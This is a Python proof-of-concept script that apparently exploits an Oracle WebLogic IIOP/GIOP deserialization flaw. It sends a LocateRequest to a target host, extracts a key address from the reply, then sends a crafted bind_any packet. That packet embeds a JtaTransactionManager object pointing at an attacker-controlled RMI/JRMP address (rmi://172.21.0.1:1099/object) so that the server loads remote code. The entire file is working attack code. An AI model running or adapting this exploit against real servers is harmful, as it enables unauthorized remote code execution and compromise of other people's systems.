# -*- coding: utf-8 -*-
# # @Time : 2020/5/20 17:42
# # @Author : huha
import socket
import sys
import struct
import time
import re

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

server_address = (sys.argv[1], int(sys.argv[2]))
print('connecting to {0} port {1}'.format(server_address[0],server_address[1]))
sock.connect(server_address)

locaterequest=b'\x47\x49\x4f\x50\x01\x02\x00\x03\x00\x00\x00\x17\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x0b\x4e\x61\x6d\x65\x53\x65\x72\x76\x69\x63\x65'
print('sending locaterequest: \n{}'.format(locaterequest))
sock.sendall(locaterequest)
data = sock.recv(1024)

# key_address通过正则匹配获取
comp = re.compile(b'(.*?)([0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3})(.*?)(BEA)',re.S)
a = comp.match(data)
key_index = data.find(a.group(4))-1
key_address = data[key_index:key_index+120]
print('get key_address: \n{}'.format(key_address))

# 直接复制bind_any的数据包，jrmp地址需要手动更改
jrmp = b'rmi://172.21.0.1:1099/object'
# print(len(jrmp))
bind_any = b'\x47\x49\x4f\x50\x01\x02\x00\x00\x00\x00\x03\x47\x00\x00\x00\x03\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x78'+\
       key_address+\
       b'\x00\x00\x00\x09\x62\x69\x6e\x64\x5f\x61\x6e\x79\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x05\x00\x00\x00\x1e\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x0f\x31\x36\x39\x2e\x32\x35\x34\x2e\x31\x33\x32\x2e\x37\x32\x00\x00\x74\xf2\x00\x00\x00\x00\x00\x01\x00\x00\x00\x0c\x00\x00\x00\x00\x00\x01\x00\x20\x05\x01\x00\x01\x00\x00\x00\x06\x00\x00\x00\xf8\x00\x00\x00\x00\x00\x00\x00\x28\x49\x44\x4c\x3a\x6f\x6d\x67\x2e\x6f\x72\x67\x2f\x53\x65\x6e\x64\x69\x6e\x67\x43\x6f\x6e\x74\x65\x78\x74\x2f\x43\x6f\x64\x65\x42\x61\x73\x65\x3a\x31\x2e\x30\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\xbc\x00\x01\x02\x00\x00\x00\x00\x0f\x31\x36\x39\x2e\x32\x35\x34\x2e\x31\x33\x32\x2e\x37\x32\x00\x00\x74\xf2\x00\x00\x00\x00\x00\x64\x00\x42\x45\x41\x08\x01\x03\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x28\x49\x44\x4c\x3a\x6f\x6d\x67\x2e\x6f\x72\x67\x2f\x53\x65\x6e\x64\x69\x6e\x67\x43\x6f\x6e\x74\x65\x78\x74\x2f\x43\x6f\x64\x65\x42\x61\x73\x65\x3a\x31\x2e\x30\x00\x00\x00\x00\x03\x31\x32\x00\x00\x00\x00\x00\x01\x42\x45\x41\x2a\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\xc3\x25\x80\xc0\x6f\x84\x56\xab\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x2c\x00\x00\x00\x00\x00\x01\x00\x20\x00\x00\x00\x03\x00\x01\x00\x20\x00\x01\x00\x01\x05\x01\x00\x01\x00\x01\x01\x00\x00\x00\x00\x03\x00\x01\x01\x00\x00\x01\x01\x09\x05\x01\x00\x01\x00\x00\x00\x0f\x00\x00\x00\x20\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x42\x45\x41\x03\x00\x00\x00\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x25\xf4\xe3\xc0\x00\x00\x00\x00\x42\x45\x41\x00\x00\x00\x00\x04\x00\x0a\x03\x06\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x04\x6e\x61\x6d\x65\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x1d\x00\x00\x00\x1c\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'+\
        b'\x7f\xff\xff\x02'+ \
        b'\x00\x00\x00\x74\x52\x4d\x49\x3a\x63\x6f\x6d\x2e\x62\x65\x61\x2e\x63\x6f\x72\x65\x2e\x72\x65\x70\x61\x63\x6b\x61\x67\x65\x64\x2e\x73\x70\x72\x69\x6e\x67\x66\x72\x61\x6d\x65\x77\x6f\x72\x6b\x2e\x74\x72\x61\x6e\x73\x61\x63\x74\x69\x6f\x6e\x2e\x6a\x74\x61\x2e\x4a\x74\x61\x54\x72\x61\x6e\x73\x61\x63\x74\x69\x6f\x6e\x4d\x61\x6e\x61\x67\x65\x72\x3a\x30\x44\x33\x30\x34\x38\x45\x30\x37\x42\x31\x44\x33\x42\x37\x42\x3a\x34\x45\x46\x33\x45\x43\x46\x42\x42\x36\x32\x38\x39\x38\x32\x46\x00\xff\xff\xff\xff\x00\x01\x01\x00\x00\x00\x00\x00\x00\x00\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x7f\xff\xff\x02\x00\x00\x00\x23\x49\x44\x4c\x3a\x6f\x6d\x67\x2e\x6f\x72\x67\x2f\x43\x4f\x52\x42\x41\x2f\x57\x53\x74\x72\x69\x6e\x67\x56\x61\x6c\x75\x65\x3a\x31\x2e\x30\x00\x00'+\
        struct.pack('!i',len(jrmp)-1) +\
        jrmp

time.sleep(1)
print('sendind bind_any: \n{}'.format(bind_any))
sock.sendall(bind_any)
data = sock.recv(1024)
print('received {}'.format(data))